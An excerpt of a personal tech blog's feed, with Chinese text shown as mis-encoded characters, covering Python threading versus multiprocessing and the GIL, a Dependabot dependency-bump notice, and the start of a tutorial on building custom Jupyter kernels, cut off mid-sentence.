id="xian-cheng">çº¿ç¨‹</span></h3><p>çº¿ç¨‹æ˜¯å¯ä»¥è°ƒåº¦æ‰§è¡Œçš„è¿›ç¨‹ï¼ˆä¹Ÿç§°ä¸ºâ€œè½»é‡çº§è¿›ç¨‹â€ï¼‰ä¸­çš„å®ä½“ã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥äº§ç”Ÿå¤šä¸ªçº¿ç¨‹ã€‚ä¸»è¦åŒºåˆ«åœ¨äºï¼Œè¿›ç¨‹ä¸­çš„æ‰€æœ‰çº¿ç¨‹å…±äº«åŒä¸€å†…å­˜ã€‚</p><p>å…³é”®äº‹å®ï¼š</p><ul><li>å¯ä»¥åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­äº§ç”Ÿå¤šä¸ªçº¿ç¨‹</li><li>å†…å­˜åœ¨æ‰€æœ‰çº¿ç¨‹ä¹‹é—´å…±äº«</li><li>å¯åŠ¨çº¿ç¨‹æ¯”å¯åŠ¨è¿›ç¨‹è¦å¿«</li><li>é€‚ç”¨äº I/O å¯†é›†å‹ä»»åŠ¡</li><li>è½»é‡</li><li>å†…å­˜å ç”¨å°‘</li><li>æ‰€æœ‰çº¿ç¨‹ä½¿ç”¨ä¸€ä¸ªGILï¼Œå³çº¿ç¨‹å—GILé™åˆ¶</li><li>ç”±äºGILï¼Œå¤šçº¿ç¨‹å¤„ç†å¯¹CPUå¯†é›†çš„ä»»åŠ¡æ— æ•ˆ</li><li>ä¸å¯ä¸­æ–­/æ€æ­»-&gt;æ³¨æ„å†…å­˜æ³„æ¼</li><li>å‡ºç°ç«æ€æƒ…å†µçš„å¯èƒ½æ€§å¢åŠ </li></ul><h3><span id="python-zhong-de-xian-cheng">Pythonä¸­çš„çº¿ç¨‹</span></h3><p>ä½¿ç”¨ <code>threading</code> æ¨¡å—ã€‚</p><p>æ³¨æ„ï¼šç”±äºå—CPUé™åˆ¶ï¼Œä»¥ä¸‹ç¤ºä¾‹é€šå¸¸ä¸ä¼šä»å¤šä¸ªçº¿ç¨‹ä¸­å—ç›Šã€‚ å®ƒåº”æ˜¾ç¤ºå¦‚ä½•ä½¿ç”¨çº¿ç¨‹çš„ç¤ºä¾‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:        </span><br><span class="line">    threads = []</span><br><span class="line">    num_threads = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºçº¿ç¨‹ï¼Œå¹¶ç»™æ¯ä¸€ä¸ªçº¿ç¨‹åˆ†é…å‡½æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        thread = Thread(target=square_numbers)</span><br><span class="line">        threads.append(thread)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯åŠ¨æ‰€æœ‰çº¿ç¨‹</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="comment"># é˜»å¡ä¸»çº¿ç¨‹ç›´åˆ°æ‰€æœ‰çº¿ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure><h3><span id="xian-cheng-he-shi-you-yong">çº¿ç¨‹ä½•æ—¶æœ‰ç”¨</span></h3><p>å°½ç®¡ä½¿ç”¨äº†GILï¼Œä½†åœ¨ç¨‹åºå¿…é¡»ä¸é€Ÿåº¦è¾ƒæ…¢çš„è®¾å¤‡ï¼ˆä¾‹å¦‚ç¡¬ç›˜é©±åŠ¨å™¨æˆ–ç½‘ç»œè¿æ¥ï¼‰è¿›è¡Œé€šè®¯æ—¶ï¼Œå®ƒä»å¯ç”¨äº I/O å¯†é›†å‹ä»»åŠ¡ã€‚ é€šè¿‡çº¿ç¨‹åŒ–ï¼Œç¨‹åºå¯ä»¥èŠ±è´¹æ—¶é—´ç­‰å¾…è¿™äº›è®¾å¤‡å¹¶åŒæ—¶æ™ºèƒ½åœ°æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚</p><p>ç¤ºä¾‹ï¼šä»å¤šä¸ªç«™ç‚¹ä¸‹è½½ç½‘ç«™ä¿¡æ¯ã€‚ ä¸ºæ¯ä¸ªç«™ç‚¹ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹ã€‚</p><h3><span id="duo-jin-cheng">å¤šè¿›ç¨‹</span></h3><p>ä½¿ç”¨ <code>multiprocessing</code> æ¨¡å—ã€‚ è¯­æ³•ä¸ä¸Šé¢éå¸¸ç›¸ä¼¼ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square_numbers</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        result = i * i</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    processes = []</span><br><span class="line">    num_processes = os.cpu_count()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºè¿›ç¨‹ï¼Œå¹¶ç»™æ¯ä¸€ä¸ªçº¿ç¨‹åˆ†é…å‡½æ•°</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_processes):</span><br><span class="line">        process = Process(target=square_numbers)</span><br><span class="line">        processes.append(process)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯åŠ¨æ‰€æœ‰è¿›ç¨‹</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç­‰å¾…æ‰€æœ‰è¿›ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="comment"># é˜»å¡ä¸»çº¿ç¨‹ç›´åˆ°æ‰€æœ‰è¿›ç¨‹ç»“æŸ</span></span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.join()</span><br></pre></td></tr></table></figure><h3><span id="shi-me-shi-hou-duo-jin-cheng-you-yong">ä»€ä¹ˆæ—¶å€™å¤šè¿›ç¨‹æœ‰ç”¨</span></h3><p>è¿™å¯¹äºå¿…é¡»å¯¹å¤§é‡æ•°æ®æ‰§è¡Œå¤§é‡CPUæ“ä½œä¸”éœ€è¦å¤§é‡è®¡ç®—æ—¶é—´çš„CPUå¯†é›†å‹ä»»åŠ¡å¾ˆæœ‰ç”¨ã€‚é€šè¿‡å¤šè¿›ç¨‹ï¼Œä½ å¯ä»¥å°†æ•°æ®åˆ†æˆç›¸ç­‰çš„éƒ¨åˆ†ï¼Œç„¶ååœ¨ä¸åŒçš„CPUä¸Šè¿›è¡Œå¹¶è¡Œè®¡ç®—ã€‚</p><p>ç¤ºä¾‹ï¼šè®¡ç®—ä»1åˆ°1000000çš„æ‰€æœ‰æ•°å­—çš„å¹³æ–¹æ•°ã€‚å°†æ•°å­—åˆ†æˆç›¸ç­‰å¤§å°çš„éƒ¨åˆ†ï¼Œå¹¶å¯¹æ¯ä¸ªå­é›†ä½¿ç”¨ä¸€ä¸ªè¿‡ç¨‹ã€‚</p><h3><span id="gil-quan-ju-jie-shi-qi-suo">GIL-å…¨å±€è§£é‡Šå™¨é”</span></h3><p>è¿™æ˜¯ä¸€ä¸ªäº’æ–¥é”ï¼ˆæˆ–é”ï¼‰ï¼Œä»…å…è®¸ä¸€ä¸ªçº¿ç¨‹æ§åˆ¶Pythonè§£é‡Šå™¨ã€‚è¿™æ„å‘³ç€å³ä½¿åœ¨å¤šçº¿ç¨‹ä½“ç³»ç»“æ„ä¸­ï¼ŒGILä¸€æ¬¡ä¹Ÿåªå…è®¸ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œã€‚</p><h3><span id="wei-shi-me-xu-yao-ta">ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</span></h3><p>ä¹‹æ‰€ä»¥éœ€è¦å®ƒï¼Œæ˜¯å› ä¸ºCPythonï¼ˆPythonçš„å¼•ç”¨å®ç°ï¼‰çš„å†…å­˜ç®¡ç†ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ Pythonä½¿ç”¨å¼•ç”¨è®¡æ•°è¿›è¡Œå†…å­˜ç®¡ç†ã€‚è¿™æ„å‘³ç€åœ¨Pythonä¸­åˆ›å»ºçš„å¯¹è±¡å…·æœ‰å¼•ç”¨è®¡æ•°å˜é‡ï¼Œè¯¥å˜é‡è·Ÿè¸ªæŒ‡å‘è¯¥å¯¹è±¡çš„å¼•ç”¨æ•°ã€‚å½“æ­¤è®¡æ•°è¾¾åˆ°é›¶æ—¶ï¼Œå°†é‡Šæ”¾å¯¹è±¡å ç”¨çš„å†…å­˜ã€‚é—®é¢˜åœ¨äºè¯¥å¼•ç”¨è®¡æ•°å˜é‡éœ€è¦ä¿æŠ¤ï¼Œä»¥é˜²æ­¢ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å¢å¤§æˆ–å‡å°å…¶å€¼çš„ç«äº‰æ¡ä»¶ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œåˆ™å¯èƒ½å¯¼è‡´ä»æœªé‡Šæ”¾çš„å†…å­˜æ³„æ¼ï¼Œæˆ–è€…åœ¨ä»ç„¶å­˜åœ¨å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨çš„æƒ…å†µä¸‹é”™è¯¯åœ°é‡Šæ”¾äº†å†…å­˜ã€‚</p><h3><span id="ru-he-bi-mian-gil">å¦‚ä½•é¿å…GIL</span></h3><p>GILåœ¨Pythonç¤¾åŒºä¸­å¼•èµ·å¾ˆå¤§äº‰è®®ã€‚é¿å…GILçš„ä¸»è¦æ–¹æ³•æ˜¯ä½¿ç”¨å¤šçº¿ç¨‹è€Œä¸æ˜¯çº¿ç¨‹ã€‚å¦ä¸€ä¸ªï¼ˆä½†æ˜¯å¾ˆä¸èˆ’æœï¼‰çš„è§£å†³æ–¹æ¡ˆæ˜¯é¿å…CPythonå®ç°ï¼Œè€Œä½¿ç”¨ <code>Jython</code> æˆ– <code>IronPython</code> ä¹‹ç±»çš„è‡ªç”±çº¿ç¨‹Pythonå®ç°ã€‚ç¬¬ä¸‰ç§é€‰æ‹©æ˜¯å°†åº”ç”¨ç¨‹åºçš„éƒ¨åˆ†ç§»åˆ°äºŒè¿›åˆ¶æ‰©å±•æ¨¡å—ä¸­ï¼Œå³ä½¿ç”¨Pythonä½œä¸ºç¬¬ä¸‰æ–¹åº“çš„åŒ…è£…å™¨ï¼ˆä¾‹å¦‚åœ¨C / C ++ä¸­ï¼‰ã€‚è¿™æ˜¯ <code>numpy</code> å’Œ <code>scipy</code> é‡‡å–çš„è·¯å¾„ã€‚</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      15. å¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>chore(deps): bump set-getter from 0.1.0 to 0.1.1</title>
    <link href="https://qiwihui.com/qiwihui-blog-142/"/>
    <id>https://qiwihui.com/qiwihui-blog-142/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2022-08-13T01:54:25.690Z</updated>
    
    <content type="html"><![CDATA[<p>Bumps <a href="https://github.com/doowb/set-getter">set-getter</a> from 0.1.0 to 0.1.1.</p><details><summary>Commits</summary><ul><li>See full diff in <a href="https://github.com/doowb/set-getter/commits/0.1.1">compare view</a></li></ul></details><br><p><a href="https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores"><img src="https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=set-getter&amp;package-manager=npm_and_yarn&amp;previous-version=0.1.0&amp;new-version=0.1.1" alt="Dependabot compatibility score"></a></p><p>Dependabot will resolve any conflicts with this PR as long as you donâ€™t alter it yourself. You can also trigger a rebase manually by commenting <code>@dependabot rebase</code>.</p><hr><details><summary>Dependabot commands and options</summary><br><p>You can trigger Dependabot actions by commenting on this PR:</p><ul><li><code>@dependabot rebase</code> will rebase this PR</li><li><code>@dependabot recreate</code> will recreate this PR, overwriting any edits that have been made to it</li><li><code>@dependabot merge</code> will merge this PR after your CI passes on it</li><li><code>@dependabot squash and merge</code> will squash and merge this PR after your CI passes on it</li><li><code>@dependabot cancel merge</code> will cancel a previously requested merge and block automerging</li><li><code>@dependabot reopen</code> will reopen this PR if it is closed</li><li><code>@dependabot close</code> will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually</li><li><code>@dependabot ignore this major version</code> will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this minor version</code> will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot ignore this dependency</code> will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)</li><li><code>@dependabot use these labels</code> will set the current labels as the default for future PRs for this repo and language</li><li><code>@dependabot use these reviewers</code> will set the current reviewers as the default for future PRs for this repo and language</li><li><code>@dependabot use these assignees</code> will set the current assignees as the default for future PRs for this repo and language</li><li><code>@dependabot use this milestone</code> will set the current milestone as the default for future PRs for this repo and language</li></ul><p>You can disable automated security fix PRs for this repo from the <a href="https://github.com/qiwihui/blog/network/alerts">Security Alerts page</a>.</p></details><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      chore(deps): bump set-getter from 0.1.0 to 0.1.1
    
    </summary>
    
    
      <category term="dependencies" scheme="https://qiwihui.com/tags/dependencies/"/>
    
  </entry>
  
  <entry>
    <title>Making kernels for jupyter</title>
    <link href="https://qiwihui.com/qiwihui-blog-40/"/>
    <id>https://qiwihui.com/qiwihui-blog-40/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªå†…æ ¸æ˜¯è¿è¡Œå’Œè§£æç”¨æˆ·ä»£ç çš„ç¨‹åºã€‚IPythonåŒ…å«äº†ä¸€ä¸ªè¿è¡Œå’Œè§£æPythonä»£ç çš„å†…æ ¸ï¼Œè€Œä¸”äººä»¬å·²ç»å†™äº†å¤šç§è¯­è¨€çš„å†…æ ¸ã€‚</p><p>å½“Jupyterå¼€å§‹ä¸€ä¸ªå†…æ ¸çš„æ—¶å€™ï¼Œå®ƒä¼šä¼ é€’å®ƒä¸€ä¸ªè¿æ¥æ–‡ä»¶ã€‚å®ƒæŒ‡å®šäº†å¦‚ä½•ä¸å‰ç«¯å¼€å§‹é€šä¿¡ã€‚</p><span id="more"></span><p>ä»¥ä¸‹æ˜¯å®è·µï¼š</p><h3><span id="an-zhuang-huan-jing">å®‰è£…ç¯å¢ƒ</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">conda create -n py365400 python=3.6.5 jupyter ipykernel</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">conda activate py365</span></span><br></pre></td></tr></table></figure><h3><span id="lie-chu-dang-qian-nei-he">åˆ—å‡ºå½“å‰å†…æ ¸</span></h3><p>åœ¨Unixç³»ç»Ÿä¸­ï¼Œå¯ç”¨çš„å†…æ ¸åˆ—åœ¨å¦‚ä¸‹æ–‡ä»¶å¤¹ä¸­ï¼ˆ<a href="https://jupyter-client.readthedocs.io/en/latest/kernels.html#kernel-specs">Kernel specs</a>ï¼‰:</p><p>System:</p><ul><li><code>/usr/share/jupyter/kernels</code></li><li><code>/usr/local/share/jupyter/kernels</code></li></ul><p>Env:</p><ul><li><code>&#123;sys.prefix&#125;/share/jupyter/kernels</code></li></ul><p>User:</p><ul><li><code>~/.local/share/jupyter/kernels (Linux)</code></li><li><code>~/Library/Jupyter/kernels (Mac)</code></li></ul><p>ç”¨æˆ·ä½ç½®çš„ä¼˜å…ˆçº§é«˜äºç³»ç»Ÿçº§åˆ«çš„ï¼Œå¿½ç•¥åå­—çš„å¤§å°å†™ã€‚å› æ­¤ä¸è®ºç³»ç»Ÿæ˜¯å¦å¤§å°å†™æ•æ„Ÿï¼Œéƒ½å¯ä»¥ä»¥åŒæ ·çš„çƒ¦å™¶äº‹æ¥è·å–å†…æ ¸ã€‚å› ä¸ºå†…æ ¸åå­—ä¼šåœ¨URLå‡ºç°ï¼Œå› æ­¤å†…æ ¸åå­—éœ€è¦æ˜¯ä¸€ä¸ªç®€å•çš„ï¼Œåªä½¿ç”¨ASCIIå­—æ¯ï¼Œæ•°å­—å’Œç®€å•çš„åˆ†éš”ç¬¦<code>-</code>ï¼Œ<code>.</code>ï¼Œ <code>_</code>ã€‚å¦‚æœè®¾ç½®äº† <code>JUPYTER_PATH</code> ç¯å¢ƒå˜é‡çš„è¯ï¼Œä¹Ÿä¼šæœç´¢å…¶ä»–ä½ç½®ã€‚</p><p>ä¾‹å¦‚åœ¨æˆ‘çš„Macä¸Šï¼Œæœ‰ä¸¤ä¸ªä¸ªå†…æ ¸ï¼Œä¸€ä¸ªæ˜¯ python 3 çš„ï¼Œå¦ä¸€ä¸ªæ˜¯ pyspark(python 2) çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> jupyter kernelspec list</span></span><br><span class="line">Available kernels:</span><br><span class="line">  pyspark2    /Users/qiwihui/Library/Jupyter/kernels/pyspark2</span><br><span class="line">  python3     /usr/local/miniconda3/envs/py365/share/jupyter/kernels/python3</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸æ–‡ä»¶å¤¹ä¸‹ï¼Œç°åœ¨ä¼šä½¿ç”¨ä¸‰ç§ç±»å‹çš„æ–‡ä»¶ã€‚<code>kernel.json</code>, <code>kernel.js</code>å’Œlogå›¾ç‰‡æ–‡ä»¶ã€‚ç›®å‰ï¼Œæ²¡æœ‰ä½¿ç”¨å…¶ä»–æ–‡ä»¶ï¼Œä½†æ˜¯å°†æ¥å¯èƒ½ä¼šæ”¹å˜ã€‚</p><p>æœ€é‡è¦çš„æ–‡ä»¶æ˜¯ <code>kernel.json</code>ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªjsonåºåˆ—åŒ–çš„å­—å…¸åŒ…å«ä»¥ä¸‹å­—æ®µ</p><ul><li><code>argv</code>: ç”¨æ¥å¯åŠ¨å†…æ ¸çš„å‘½ä»¤è¡Œå‚æ•°åˆ—è¡¨ã€‚<code>&#123;connection_file&#125;</code> å°†ä¼šè¢«å®é™…çš„è¿æ¥æ–‡ä»¶çš„è·¯å¾„æ›¿æ¢ã€‚</li><li><code>display_name</code>: åœ¨UIä¸Šå±•ç¤ºçš„å†…æ ¸åå­—ã€‚ä¸åƒåœ¨APIä¸­ä½¿ç”¨çš„å†…æ ¸åå­—ï¼Œè¿™é‡Œçš„åå­—å¯ä»¥åŒ…å«ä»»æ„å­—ç¬¦ã€‚</li><li><code>language</code>: å†…æ ¸çš„è¯­è¨€åå­—ã€‚å½“è½½å…¥notebookçš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„å†…æ ¸ï¼Œé‚£ä¹ˆåŒ¹é…ç›¸åº”è¯­è¨€çš„å†…æ ¸å°†ä¼šè¢«å¯åŠ¨ã€‚è¿™æ ·å…è®¸ä¸€ä¸ªå†™äº†ä»»ä½•Pythonæˆ–è€…juliaå†…æ ¸çš„notebookå¯ä»¥ä¸ç”¨æˆ·çš„Pythonæˆ–è€…juliaå†…æ ¸åˆé€‚çš„è”ç³»èµ·æ¥ï¼Œå³ä½¿å®ƒä»¬æ²¡æœ‰åœ¨ä¸ç”¨æˆ·å†…æ ¸åŒæ ·çš„åå­—ä¸‹ã€‚</li><li><code>interrupt_mode</code>ï¼šå¯èƒ½æ˜¯signalæˆ–è€…messageæŒ‡å®šäº†å®¢æˆ·ç«¯å¦‚ä½•åœ¨è¿™ä¸ªå†…æ ¸ä¸­åœæ­¢å•å…ƒè¿è¡Œã€‚æ˜¯é€šè¿‡å‘é€ä¸€ä¸ªä¿¡å·å‘¢ï¼Œè¿˜æ˜¯å‘é€ä¸€ä¸ª<code>interrupt_request</code>æ¶ˆæ¯åœ¨<code>control channel</code>ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œå°†é»˜è®¤ä½¿ç”¨signalæ¨¡å¼ã€‚</li><li><code>env</code>ï¼šä¸ºå†…æ ¸è®¾ç½®çš„ç¯å¢ƒå˜é‡ã€‚åœ¨å†…æ ¸å¯åŠ¨å‰ï¼Œä¼šæ·»åŠ åˆ°å½“å‰çš„ç¯å¢ƒå˜é‡é‡Œã€‚</li><li><code>metadata</code>ï¼šå…³äºè¿™ä¸ªå†…æ ¸çš„å…¶ä»–ç›¸å…³å±æ€§ã€‚å¸®åŠ©å®¢æˆ·ç«¯é€‰æ‹©å†…æ ¸ã€‚</li></ul><p>æ¯”å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /usr/local/miniconda3/envs/py365/share/jupyter/kernels/python3/kernel.json</span> </span><br><span class="line">&#123;</span><br><span class="line"> &quot;argv&quot;: [</span><br><span class="line">  &quot;/usr/local/miniconda3/envs/py365/bin/python&quot;,</span><br><span class="line">  &quot;-m&quot;,</span><br><span class="line">  &quot;ipykernel_launcher&quot;,</span><br><span class="line">  &quot;-f&quot;,</span><br><span class="line">  &quot;&#123;connection_file&#125;&quot;</span><br><span class="line"> ],</span><br><span class="line"> &quot;display_name&quot;: &quot;Python 3&quot;,</span><br><span class="line"> &quot;language&quot;: &quot;python&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“å†…æ ¸å¼€å§‹çš„æ—¶å€™å°†ä¼šä¼ å…¥ä¸€ä¸ªè¿æ¥æ–‡ä»¶çš„è·¯å¾„ï¼Œè¿™ä¸ªæ–‡ä»¶åªå¯¹å½“å‰ç”¨æˆ·å¯ç”¨ï¼Œä¼šåŒ…å«ç±»ä¼¼ä¸‹é¢çš„ä¸€ä¸ªJSONå­—å…¸ã€‚</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;control_port&quot;</span><span class="punctuation">:</span> <span class="number">50160</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;shell_port&quot;</span><span class="punctuation">:</span> <span class="number">57503</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;transport&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tcp&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature_scheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hmac-sha256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;stdin_port&quot;</span><span class="punctuation">:</span> <span class="number">52597</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;hb_port&quot;</span><span class="punctuation">:</span> <span class="number">42540</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iopub_port&quot;</span><span class="punctuation">:</span> <span class="number">40885</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a0436f6c-1916-498b-8eb9-e81ab9368e84&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>transport</code>, <code>ip</code> å’Œè®¾å®šäº†è¯¥ä½¿ç”¨ ZeroMQ ç»‘å®šçš„äº”ä¸ª_portã€‚æ¯”å¦‚ shell å¥—æ¥å­—çš„åœ°å€åº”è¯¥æ˜¯ï¼š<code>tcp://127.0.0.1:57503</code>ã€‚åœ¨æ¯ä¸ªå†…æ ¸å¼€å§‹çš„æ—¶å€™ä¼šæŒ‡å®šéšæ„çš„ç«¯å£ã€‚<code>signature_scheme</code> å’Œ <code>key</code> ç”¨æ¥åŠ å¯†ä¿¡æ¯ï¼Œå› æ­¤ç³»ç»Ÿçš„å…¶ä»–ç”¨æˆ·ä¸èƒ½å‘é€ä»£ç æ¥è¿è¡Œå†…æ ¸ã€‚</p><p>ç°åœ¨æˆ‘éœ€è¦è‡ªå·±å®šä¹‰ä¸€ä¸ªå†…æ ¸ï¼Œè¿™ä¸ªå†…æ ¸å¯ä»¥æ‰§è¡Œæˆ‘ä»¬å®šä¹‰çš„é€»è¾‘ã€‚</p><h3><span id="tian-jia-xin-nei-he">æ·»åŠ æ–°å†…æ ¸</span></h3><p>è¿™æ˜¯ç®€å•çš„é‡ç”¨ IPython  çš„å†…æ ¸æœºåˆ¶æ¥å®ç°è¿™ä¸ªæ–°çš„å†…æ ¸ã€‚</p><p>æ­¥éª¤ï¼š</p><p>å­ç±»åŒ–ipykernel.kernelbase.Kernelï¼Œç„¶åå®ç°ä¸‹é¢çš„æ–¹æ³•å’Œå±æ€§</p><p>class MyKernel</p><pre><code>- implementation- implementation_version- banner    Kernel infoä¼šè¿”å›çš„ä¿¡æ¯ã€‚ImplementationæŒ‡çš„æ˜¯å†…æ ¸è€Œä¸æ˜¯è¯­è¨€ï¼Œæ¯”å¦‚IPythonè€Œä¸æ˜¯Pythonã€‚banneræ˜¯åœ¨æ§åˆ¶UIä¸Šæ˜¾ç¤ºç¬¬ä¸€ä¸ªæç¤ºç¬¦ä¹‹å‰çš„ä¸œè¥¿ã€‚è¿™äº›éƒ½æ˜¯å­—ç¬¦ä¸²- language_info    Kernel infoä¼šè¿”å›çš„ä¿¡æ¯å­—å…¸ã€‚åº”è¯¥åŒ…å«mimetypeé”®ï¼Œå€¼æ˜¯ç›®æ ‡è¯­è¨€çš„mimetypeï¼Œæ¯”å¦‚text/x-pythonã€‚nameé”®æ˜¯å®ç°çš„è¯­è¨€æ¯”å¦‚pythonï¼Œfile_extensionæ¯”å¦‚.pyï¼Œè€Œä¸”ä¹Ÿå¯èƒ½æ ¹æ®ä¸åŒè¯­è¨€åŒ…å«codemirror_modeå’Œpygments_lexer- do_execute(code, silent, store_history=True, user_expressions=None, allow_stdin=False)    æ‰§è¡Œç”¨æˆ·ä»£ç         - codeï¼šè¦æ‰§è¡Œçš„ä»£ç         - silentï¼šæ˜¯å¦å±•ç¤ºè¾“å‡º        - store_history: æ˜¯å¦åœ¨å†å²é‡Œè®°å½•ä»£ç ï¼Œå¹¶ä¸”å¢åŠ æ‰§è¡Œæ¬¡æ•°ã€‚        - user_expressionsï¼šåœ¨ä»£ç è¢«æ‰§è¡Œåå¯¹è¿™äº›è¡¨è¾¾å¼æ±‚å€¼        - allow_stdinï¼šå‰ç«¯æ˜¯å¦æä¾›è¾“å…¥è¯·æ±‚    ä½ çš„æ–¹æ³•åº”è¯¥è¿”å›ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«åœ¨Execution resultsè§„å®šçš„å­—å…¸ã€‚ä¸ºäº†å±•ç°è¾“å‡ºï¼Œå®ƒå¯ä»¥ä½¿ç”¨send_response() æ¥å‘é€æ¶ˆæ¯ã€‚</code></pre><p>ä¸ºäº†å¯åŠ¨ä½ çš„å†…æ ¸ï¼Œåœ¨æ¨¡å—åé¢åŠ ä¸Šï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> ipykernel.kernelapp <span class="keyword">import</span> IPKernelApp</span><br><span class="line">    IPKernelApp.launch_instance(kernel_class=MyKernel)</span><br></pre></td></tr></table></figure><p>ç°åœ¨åˆ›å»ºä¸€ä¸ªJSONçš„å†…æ ¸è¯´æ˜æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ <code>jupyter kernelspec install &lt;/path/to/kernel&gt;</code>ã€‚å°†ä½ çš„å†…æ 